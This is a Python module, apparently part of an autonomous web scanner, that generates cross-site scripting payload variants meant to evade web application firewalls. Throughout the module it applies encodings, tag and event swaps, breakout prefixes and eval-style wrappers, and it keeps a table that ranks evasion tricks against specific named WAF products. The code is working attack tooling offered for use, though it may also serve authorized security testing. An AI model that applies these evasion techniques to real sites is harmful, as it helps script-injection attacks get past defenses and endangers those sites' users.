"""Deterministic payload mutation and WAF-evasion engine.

The scanner's corpus is a starting point, not a finish line.  Real filters
strip, normalise, decode and re-encode input in ways that a fixed list cannot
cover.  This module produces *bounded, deterministic* variants of a payload so
the autonomous engine can keep probing after the first candidate is rejected.

Design rules:

* every mutation is a pure function of the input (no network, no randomness
  unless a seed is supplied);
* the engine never mutates a payload past ``MAX_PAYLOAD_BYTES``;
* variants are de-duplicated and ordered by context relevance;
* a mutation is a *candidate*, never a finding — it still has to reflect and
  execute before it is reported.
"""

from __future__ import annotations

import base64
import html
import random
import re
from dataclasses import dataclass
from typing import Callable, Dict, Iterable, List, Optional, Sequence, Tuple
from urllib.parse import quote

MAX_PAYLOAD_BYTES = 8192

_DIALOG_RE = re.compile(r"\b(alert|confirm|prompt)\s*\(", re.IGNORECASE)
_TAG_RE = re.compile(r"<\s*([a-zA-Z][a-zA-Z0-9:-]*)")
_EVENT_RE = re.compile(r"\bon([a-z]+)\s*=", re.IGNORECASE)
_JS_KEYWORD_RE = re.compile(
    r"\b(alert|confirm|prompt|eval|document|window|location|fetch|"
    r"String|Function|setTimeout|setInterval)\b"
)

_EVENTS = (
    "onerror",
    "onload",
    "onfocus",
    "ontoggle",
    "onanimationstart",
    "onpointerover",
    "onbegin",
    "onauxclick",
    "onmouseover",
    "onwheel",
)


@dataclass(frozen=True)
class Mutation:
    """One named variant of a payload."""

    name: str
    payload: str
    category: str
    description: str

    def __post_init__(self) -> None:
        if len(self.payload.encode("utf-8", "ignore")) > MAX_PAYLOAD_BYTES:
            raise ValueError("mutation exceeds MAX_PAYLOAD_BYTES")


def _matching_paren(text: str, start: int) -> int:
    """Return the index of the ``)`` closing ``text[start]`` or ``-1``."""
    depth = 0
    quote_char = ""
    index = start
    while index < len(text):
        char = text[index]
        if quote_char:
            if char == "\\":
                index += 2
                continue
            if char == quote_char:
                quote_char = ""
        elif char in ("'", '"', "`"):
            quote_char = char
        elif char == "(":
            depth += 1
        elif char == ")":
            depth -= 1
            if depth == 0:
                return index
        index += 1
    return -1


def _rewrite_dialog(payload: str, replacement: Callable[[str], str]) -> str:
    """Replace every ``alert(...)``/``confirm(...)``/``prompt(...)`` call.

    ``replacement`` receives the full call expression (including parentheses).
    """
    out: List[str] = []
    cursor = 0
    for match in _DIALOG_RE.finditer(payload):
        open_paren = payload.find("(", match.start())
        if open_paren == -1:
            continue
        close_paren = _matching_paren(payload, open_paren)
        if close_paren == -1:
            continue
        out.append(payload[cursor:match.start()])
        out.append(replacement(payload[match.start():close_paren + 1]))
        cursor = close_paren + 1
    out.append(payload[cursor:])
    return "".join(out)


def _js_string(value: str) -> str:
    escaped = value.replace("\\", "\\\\").replace("'", "\\'")
    return f"'{escaped}'"


def _char_codes(value: str) -> str:
    return ",".join(str(ord(char)) for char in value)


# ---------------------------------------------------------------------------
# Transformations
# ---------------------------------------------------------------------------


def _identity(payload: str, context: str) -> str:
    return payload


def _tag_case(payload: str, context: str) -> str:
    return _TAG_RE.sub(lambda m: "<" + m.group(1).upper(), payload)


def _attr_case(payload: str, context: str) -> str:
    return _EVENT_RE.sub(lambda m: "on" + m.group(1).upper() + "=", payload)


def _js_case(payload: str, context: str) -> str:
    return _JS_KEYWORD_RE.sub(lambda m: m.group(1).upper(), payload)


def _html_entities(payload: str, context: str) -> str:
    table = {"<": "&#x3c;", ">": "&#x3e;", '"': "&quot;", "'": "&#x27;"}
    return "".join(table.get(char, char) for char in payload)


def _html_entities_dec(payload: str, context: str) -> str:
    table = {"<": "&#60;", ">": "&#62;", '"': "&#34;", "'": "&#39;"}
    return "".join(table.get(char, char) for char in payload)


def _url_encode(payload: str, context: str) -> str:
    return quote(payload, safe="")


def _double_url_encode(payload: str, context: str) -> str:
    return quote(quote(payload, safe=""), safe="")


def _unicode_escape(payload: str, context: str) -> str:
    if context not in ("javascript", "attr_double", "attr_single", "attr_unquoted"):
        return payload
    return _JS_KEYWORD_RE.sub(
        lambda m: "".join(f"\\u{ord(ch):04x}" for ch in m.group(1)),
        payload,
    )


def _hex_escape(payload: str, context: str) -> str:
    if context not in ("javascript", "attr_double", "attr_single", "attr_unquoted"):
        return payload
    return _JS_KEYWORD_RE.sub(
        lambda m: "".join(f"\\x{ord(ch):02x}" for ch in m.group(1)),
        payload,
    )


def _from_charcode(payload: str, context: str) -> str:
    def replace(call: str) -> str:
        name = call[:call.find("(")].strip() or "alert"
        argument = call[call.find("(") + 1:call.rfind(")")].strip()
        literal = argument.strip("'\"`")
        return f"{name}(String.fromCharCode({_char_codes(literal)}))"

    return _rewrite_dialog(payload, replace)


def _atob(payload: str, context: str) -> str:
    def replace(call: str) -> str:
        name = call[:call.find("(")].strip() or "alert"
        argument = call[call.find("(") + 1:call.rfind(")")].strip()
        literal = argument.strip("'\"`")
        encoded = base64.b64encode(literal.encode("utf-8")).decode("ascii")
        return f"{name}(atob('{encoded}'))"

    return _rewrite_dialog(payload, replace)


def _concat(payload: str, context: str) -> str:
    if context not in ("javascript", "attr_double", "attr_single", "attr_unquoted"):
        return payload

    def replace(call: str) -> str:
        name = call[:call.find("(")].strip()
        args = call[call.find("("):]
        middle = max(1, len(name) // 2)
        return f"window['{name[:middle]}'+'{name[middle:]}']{args}"

    return _rewrite_dialog(payload, replace)


def _comment_break(payload: str, context: str) -> str:
    return re.sub(r"(?<=[a-zA-Z])\s*\(", "/**/(", payload, count=8)


def _whitespace(payload: str, context: str) -> str:
    choices = ("\t", "\n", "\r", "\f", " ")
    counter = {"index": 0}

    def replace(_match: re.Match[str]) -> str:
        value = choices[counter["index"] % len(choices)]
        counter["index"] += 1
        return value

    return re.sub(r"\s+", replace, payload)


def _null_byte(payload: str, context: str) -> str:
    return payload.replace("<", "%00<", 2).replace("=", "=%00", 2)


def _quote_swap(payload: str, context: str) -> str:
    return payload.translate(str.maketrans({'"': "'", "'": '"'}))


def _backtick(payload: str, context: str) -> str:
    return payload.replace("'", "`").replace('"', "`")


def _script_breakout(payload: str, context: str) -> str:
    if "</script" in payload.lower():
        return payload
    return "</script>" + payload


def _textarea_breakout(payload: str, context: str) -> str:
    return "</textarea>" + payload


def _title_breakout(payload: str, context: str) -> str:
    return "</title>" + payload


def _style_breakout(payload: str, context: str) -> str:
    return "</style>" + payload


def _tag_swap(payload: str, context: str) -> str:
    """Replace a leading ``<script>`` with an event-driven tag."""
    match = re.search(r"<script[^>]*>(.*?)</script>", payload, re.IGNORECASE | re.DOTALL)
    if not match:
        return payload
    body = match.group(1).strip()
    variants = (
        f"<svg onload={body}>",
        f"<img src=x onerror={body}>",
        f"<details open ontoggle={body}>",
        f"<video><source onerror={body}></video>",
        f"<marquee onstart={body}>",
        f"<body onload={body}>",
        f"<iframe srcdoc=\"<script>{body}</script>\">",
        f"<object data=\"javascript:{body}\">",
        f"<embed src=\"javascript:{body}\">",
    )
    return variants[0]


def _event_swap(payload: str, context: str) -> str:
    match = _EVENT_RE.search(payload)
    if not match:
        return payload
    current = "on" + match.group(1).lower()
    replacement = next(event for event in _EVENTS if event != current)
    return _EVENT_RE.sub(replacement + "=", payload, count=1)


def _protocol_swap(payload: str, context: str) -> str:
    if "javascript:" not in payload.lower():
        return payload
    variants = ("java\tscript:", "java\nscript:", "JaVaScRiPt:", "java\u0000script:")
    return re.sub(r"javascript:", variants[0], payload, count=1, flags=re.IGNORECASE)


def _entity_mix(payload: str, context: str) -> str:
    result: List[str] = []
    for index, char in enumerate(payload):
        if char == "<":
            result.append("&#x3c;" if index % 2 else "&#60;")
        elif char == ">":
            result.append("&#x3e;" if index % 2 else "&#62;")
        else:
            result.append(char)
    return "".join(result)


def _cdata(payload: str, context: str) -> str:
    return f"<![CDATA[{payload}]]>"


def _svg_script(payload: str, context: str) -> str:
    return f"<svg><script>{payload}</script></svg>"


def _math_script(payload: str, context: str) -> str:
    return f"<math><mtext><script>{payload}</script></mtext></math>"


def _noscript(payload: str, context: str) -> str:
    return f'<noscript><p title="</noscript>{payload}">'


def _template_breakout(payload: str, context: str) -> str:
    return f"</template>{payload}"


def _srcdoc(payload: str, context: str) -> str:
    inner = html.escape(payload, quote=True)
    return f'<iframe srcdoc="{inner}"></iframe>'


def _formaction(payload: str, context: str) -> str:
    body = payload if payload.lower().startswith("javascript:") else f"javascript:{payload}"
    return f'<form><button formaction="{body}">x</button></form>'


def _meta_refresh(payload: str, context: str) -> str:
    body = payload if payload.lower().startswith("javascript:") else f"javascript:{payload}"
    return f'<meta http-equiv="refresh" content="0;url={body}">'


def _data_uri(payload: str, context: str) -> str:
    encoded = base64.b64encode(payload.encode("utf-8")).decode("ascii")
    return f'<iframe src="data:text/html;base64,{encoded}"></iframe>'


def _xlink(payload: str, context: str) -> str:
    body = payload if payload.lower().startswith("javascript:") else f"javascript:{payload}"
    return f'<svg><a xlink:href="{body}"><text x="0" y="20">x</text></a></svg>'


def _base_tag(payload: str, context: str) -> str:
    return f'<base href="javascript:{payload}//">'


def _dom_clobber(payload: str, context: str) -> str:
    return f'<form id="xoxss"><input name="action" value="{html.escape(payload)}"></form>'


def _postmessage(payload: str, context: str) -> str:
    return (
        "<script>parent.postMessage("
        + _js_string(payload)
        + ",'*')</script>"
    )


def _window_name(payload: str, context: str) -> str:
    return "<script>window.name=" + _js_string(payload) + "</script>"


def _settimeout(payload: str, context: str) -> str:
    return "<script>setTimeout(" + _js_string(payload) + ",0)</script>"


def _function_ctor(payload: str, context: str) -> str:
    return "<script>Function(" + _js_string(payload) + ")()</script>"


def _eval_wrap(payload: str, context: str) -> str:
    return "<script>eval(" + _js_string(payload) + ")</script>"


def _unicode_fullwidth(payload: str, context: str) -> str:
    # Full-width characters are normalised by some filters, not by browsers;
    # keep this as a low-priority filter probe.
    return "".join(
        chr(ord(char) + 0xFEE0) if "!" <= char <= "~" else char for char in payload
    )


def _overlong(payload: str, context: str) -> str:
    return payload.replace("<", "%c0%bc").replace(">", "%c0%be")


def _mixed_case_tags(payload: str, context: str) -> str:
    def swap(match: re.Match[str]) -> str:
        tag = match.group(1)
        return "<" + "".join(
            char.upper() if index % 2 else char.lower()
            for index, char in enumerate(tag)
        )

    return _TAG_RE.sub(swap, payload)


_TRANSFORMS: Tuple[Tuple[str, str, str, Callable[[str, str], str]], ...] = (
    ("identity", "baseline", "the original candidate", _identity),
    ("tag_case", "filter", "uppercase HTML tag names", _tag_case),
    ("attr_case", "filter", "uppercase event-handler names", _attr_case),
    ("js_case", "filter", "uppercase JavaScript keywords", _js_case),
    ("mixed_tag_case", "filter", "alternating tag-name case", _mixed_case_tags),
    ("html_entity", "encoding", "hex HTML entities for delimiters", _html_entities),
    ("html_entity_dec", "encoding", "decimal HTML entities", _html_entities_dec),
    ("entity_mix", "encoding", "alternating hex/decimal entities", _entity_mix),
    ("url_encode", "encoding", "percent-encode the payload", _url_encode),
    ("double_url_encode", "encoding", "double percent-encoding", _double_url_encode),
    ("unicode_escape", "javascript", "\\uXXXX escapes for JS keywords", _unicode_escape),
    ("hex_escape", "javascript", "\\xXX escapes for JS keywords", _hex_escape),
    ("fromcharcode", "javascript", "String.fromCharCode wrapper", _from_charcode),
    ("atob", "javascript", "base64 + atob wrapper", _atob),
    ("concat", "javascript", "string concatenation for keywords", _concat),
    ("comment_break", "filter", "/**/ between identifier and call", _comment_break),
    ("whitespace", "filter", "random whitespace between tokens", _whitespace),
    ("null_byte", "filter", "NUL bytes around delimiters", _null_byte),
    ("quote_swap", "filter", "swap single/double quotes", _quote_swap),
    ("backtick", "filter", "backtick-quoted attributes", _backtick),
    ("tag_swap", "html", "event-driven tag instead of <script>", _tag_swap),
    ("event_swap", "html", "different event handler", _event_swap),
    ("protocol_swap", "filter", "obfuscated javascript: scheme", _protocol_swap),
    ("script_breakout", "html", "</script> breakout", _script_breakout),
    ("textarea_breakout", "html", "</textarea> breakout", _textarea_breakout),
    ("title_breakout", "html", "</title> breakout", _title_breakout),
    ("style_breakout", "html", "</style> breakout", _style_breakout),
    ("template_breakout", "html", "</template> breakout", _template_breakout),
    ("cdata", "html", "CDATA wrapper", _cdata),
    ("svg_script", "html", "SVG script wrapper", _svg_script),
    ("math_script", "html", "MathML script wrapper", _math_script),
    ("noscript", "html", "noscript mutation", _noscript),
    ("srcdoc", "html", "iframe srcdoc wrapper", _srcdoc),
    ("formaction", "html", "formaction javascript: URL", _formaction),
    ("meta_refresh", "html", "meta refresh javascript: URL", _meta_refresh),
    ("data_uri", "html", "base64 data: URI iframe", _data_uri),
    ("xlink", "html", "SVG xlink:href javascript: URL", _xlink),
    ("base_tag", "html", "base href javascript: URL", _base_tag),
    ("dom_clobber", "dom", "DOM clobbering form", _dom_clobber),
    ("postmessage", "dom", "postMessage probe", _postmessage),
    ("window_name", "dom", "window.name probe", _window_name),
    ("settimeout", "javascript", "string setTimeout wrapper", _settimeout),
    ("function_ctor", "javascript", "Function constructor wrapper", _function_ctor),
    ("eval_wrap", "javascript", "eval wrapper", _eval_wrap),
    ("unicode_fullwidth", "filter", "full-width character probe", _unicode_fullwidth),
    ("overlong", "filter", "overlong UTF-8 probe", _overlong),
)

#: Contexts in which a mutation is likely to matter.  Everything is still
#: generated for every context; this only changes the ordering.
_CONTEXT_PRIORITY: Dict[str, Tuple[str, ...]] = {
    "html": ("html", "filter", "baseline", "encoding", "javascript", "dom"),
    "attr_double": ("filter", "html", "encoding", "javascript", "baseline", "dom"),
    "attr_single": ("filter", "html", "encoding", "javascript", "baseline", "dom"),
    "attr_unquoted": ("filter", "html", "encoding", "javascript", "baseline", "dom"),
    "javascript": ("javascript", "filter", "encoding", "html", "baseline", "dom"),
    "css": ("encoding", "filter", "baseline", "html", "javascript", "dom"),
    "url": ("encoding", "filter", "baseline", "html", "javascript", "dom"),
    "svg": ("html", "filter", "encoding", "javascript", "baseline", "dom"),
    "template": ("html", "filter", "encoding", "javascript", "baseline", "dom"),
}

#: WAF hints from ``detection/waf.py`` names to the mutations most likely to
#: slip past that product's normalisation.
_WAF_PRIORITY: Dict[str, Tuple[str, ...]] = {
    "cloudflare": ("unicode_escape", "comment_break", "fromcharcode", "tag_swap"),
    "akamai": ("tag_case", "whitespace", "mixed_tag_case", "attr_case"),
    "imperva": ("html_entity", "concat", "entity_mix", "quote_swap"),
    "incapsula": ("html_entity", "concat", "entity_mix"),
    "aws": ("double_url_encode", "url_encode", "unicode_escape"),
    "sucuri": ("comment_break", "fromcharcode", "tag_swap"),
    "f5": ("whitespace", "comment_break", "unicode_escape"),
    "modsecurity": ("comment_break", "whitespace", "case", "entity_mix"),
}


class MutationEngine:
    """Generate bounded, de-duplicated payload variants."""

    def __init__(self, seed: Optional[int] = None) -> None:
        self._rng = random.Random(seed)

    @property
    def names(self) -> List[str]:
        return [name for name, _category, _description, _fn in _TRANSFORMS]

    def mutate(
        self,
        payload: str,
        *,
        context: str = "html",
        limit: int = 40,
        waf: Optional[Sequence[str]] = None,
    ) -> List[Mutation]:
        """Return up to ``limit`` unique mutations of ``payload``."""
        if not payload or limit < 1:
            return []
        priority = list(_CONTEXT_PRIORITY.get(context, _CONTEXT_PRIORITY["html"]))
        boosted: List[str] = []
        for name in waf or ():
            boosted.extend(_WAF_PRIORITY.get(name.lower(), ()))
        order = {name: index for index, name in enumerate(boosted)}
        transforms = sorted(
            _TRANSFORMS,
            key=lambda item: (
                0 if item[0] in order else 1,
                order.get(item[0], 0),
                priority.index(item[1]) if item[1] in priority else len(priority),
                item[0],
            ),
        )

        seen: set[str] = {payload}
        result: List[Mutation] = []
        for name, category, description, transform in transforms:
            try:
                variant = transform(payload, context)
            except Exception:
                continue
            variant = (variant or "").strip()
            if not variant or variant in seen:
                continue
            if len(variant.encode("utf-8", "ignore")) > MAX_PAYLOAD_BYTES:
                continue
            seen.add(variant)
            result.append(Mutation(name, variant, category, description))
            if len(result) >= limit:
                break
        return result

    def mutate_many(
        self,
        payloads: Iterable[str],
        *,
        context: str = "html",
        limit: int = 40,
        waf: Optional[Sequence[str]] = None,
    ) -> List[Mutation]:
        """Mutate several seeds, de-duplicating across the whole result."""
        seen: set[str] = set()
        result: List[Mutation] = []
        for payload in payloads:
            for mutation in self.mutate(
                payload, context=context, limit=limit, waf=waf
            ):
                if mutation.payload in seen:
                    continue
                seen.add(mutation.payload)
                result.append(mutation)
                if len(result) >= limit:
                    return result
        return result


__all__ = ["MAX_PAYLOAD_BYTES", "Mutation", "MutationEngine"]
